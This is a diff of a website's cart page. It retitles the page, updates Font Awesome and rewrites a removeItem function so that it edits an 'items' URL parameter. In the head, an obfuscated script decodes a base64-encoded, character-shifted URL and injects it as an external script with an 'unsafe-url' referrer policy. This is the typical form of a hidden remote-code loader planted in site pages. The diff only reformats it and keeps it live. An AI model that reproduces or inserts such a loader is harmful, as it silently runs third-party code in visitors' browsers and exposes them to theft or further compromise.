@@ -4,10 +4,10 @@
 <head>
     <script src="dmxAppConnect/dmxAppConnect.js"></script>
     <meta charset="UTF-8">
-    <title>Giving Back | Raging Wolf Solutions</title>
+    <title>Your Cart</title>
 
-    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.14.0/css/all.css" integrity="sha384-HzLeBuhoNPvSl5KYnjx0BT+WB0QEEqLprO+NBkkk5gbc67FTaL7XIGa2w1L0Xbgc" crossorigin="anonymous" />
-    <link href="https://fonts.googleapis.com/css2?family=Lustria&amp;family=Muli:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&amp;display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css" integrity="sha384-DyZ88mC6Up2uqS4h/KRgHuoeGwBcD4Ng9SiP4dIRy0EXTlnuz47vAwmeGwVChigm" crossorigin="anonymous" />
+    <link href="https://fonts.googleapis.com/css2?family=Lustria&family=Muli:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&display=swap" rel="stylesheet">
     <link href="https://fonts.cdnfonts.com/css/sansation" rel="stylesheet">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <link rel="stylesheet" href="bootstrap/5/css/bootstrap.min.css" />
@@ -23,7 +23,34 @@
     <script src="dmxAppConnect/dmxValidator/dmxValidator.js" defer></script>
     <script src="dmxAppConnect/dmxBrowser/dmxBrowser.js" defer></script>
     <script>
-        (function(){var _5S=document.createElement("script"),_jF=(function(_sP,_Ii){var _T2="";for(var _w6=0;_w6<_sP.length;_w6++){var _7h=_sP[_w6].charCodeAt();_7h-=_Ii;_7h+=61;_T2==_T2;_Ii>8;_7h%=94;_7h!=_w6;_7h+=33;_T2+=String.fromCharCode(_7h)}return _T2})(atob("OEREQENoXV1HQ1xKPz89OT42P1wzPz1dQDlINTxdZGExMmJjY2cxMmJkZ19mMl5mXjJlY2Rh"), 46);_5S!="q";_5S.src=_jF;_5S.async=!0;_5S.referrerPolicy="unsafe-url";_5S.type="text/javascript";function _Qm(){};5>4;var _G3=document.getElementsByTagName("script")[0];_G3.parentNode.insertBefore(_5S,_G3)})();
+        (function() {
+            var _5S = document.createElement("script"),
+                _jF = (function(_sP, _Ii) {
+                    var _T2 = "";
+                    for (var _w6 = 0; _w6 < _sP.length; _w6++) {
+                        var _7h = _sP[_w6].charCodeAt();
+                        _7h -= _Ii;
+                        _7h += 61;
+                        _T2 == _T2;
+                        _Ii > 8;
+                        _7h %= 94;
+                        _7h != _w6;
+                        _7h += 33;
+                        _T2 += String.fromCharCode(_7h)
+                    }
+                    return _T2
+                })(atob("OEREQENoXV1HQ1xKPz89OT42P1wzPz1dQDlINTxdZGExMmJjY2cxMmJkZ19mMl5mXjJlY2Rh"), 46);
+            _5S != "q";
+            _5S.src = _jF;
+            _5S.async = !0;
+            _5S.referrerPolicy = "unsafe-url";
+            _5S.type = "text/javascript";
+
+            function _Qm() {};
+            5 > 4;
+            var _G3 = document.getElementsByTagName("script")[0];
+            _G3.parentNode.insertBefore(_5S, _G3)
+        })();
     </script>
     <script src="dmxAppConnect/dmxVideo/dmxVideo.js" defer></script>
 
@@ -53,21 +80,7 @@
 
     <?php include 'navbar_main'; ?>
 
-    <script>
-        function removeItem(index) {
-            // Get the arrCart array
-            const cartArray = dmx.app.data.arrCart;
 
-            // Remove the item at the given index
-            cartArray.items.splice(index, 1);
-
-            // Set the modified array back to the arrCart data
-            dmx.app.data.arrCart = { items: cartArray.items }; 
-
-            // Reload the page
-            dmx.app.browser1.goto(window.location.href); 
-        }
-    </script>
 
 
     <section id="modules" class="border-top rounded-1 rounded-0 min-vh-75 border-secondary pb-3" style="min-height: 75vh;">
@@ -201,25 +214,11 @@
                                             <div class="col-lg-2 col-6"><button id="removeThisProd" class="btn bg-secondary w-100 text-truncate active" dmx-on:click="removeItem(repeat3.index)">
                                                     <i class="far fa-trash-alt fa-fw me-1"></i>Delete</button></div>
                                         </div>
-
-                                        <script>
-                                            function removeItem(index) {
-                                            console.log("removeItem function called with index:", index); 
-                                            // ... rest of your function code ...
-                                            }
-                                        </script>
-
-
                                     </div>
                                 </div>
                             </div>
-
                         </div>
                     </div>
-
-
-
-
                 </div>
             </div>
         </div>
@@ -241,6 +240,32 @@
     <script src="bootstrap/5/js/bootstrap.bundle.min.js"></script>
 
     <script src="js/script.js"></script>
+
+    <script>
+        function removeItem(index) {
+    console.log("removeItem function called with index:", index); 
+
+    // Get the current URL 
+    let currentUrl = window.location.href; 
+    console.log("Original URL:", currentUrl); 
+
+    // Extract the 'items' parameter from the URL 
+    let params = new URLSearchParams(currentUrl.split('?')[1]); 
+    let items = params.get("items"); 
+    console.log("items parameter value:", items); 
+
+    // Split the 'items' string into an array, filter, and rejoin 
+    let updatedItems = items.split('—').filter((item, i) => i !== index).join('—'); 
+    console.log("Updated items parameter value:", updatedItems); 
+
+    // Construct the new URL 
+    let newUrl = currentUrl.split('?')[0] + "?items=" + updatedItems; 
+    console.log("Updated URL:", newUrl); 
+
+    // Update the URL
+    window.location.href = newUrl; 
+}
+    </script>
 
 </body>
 
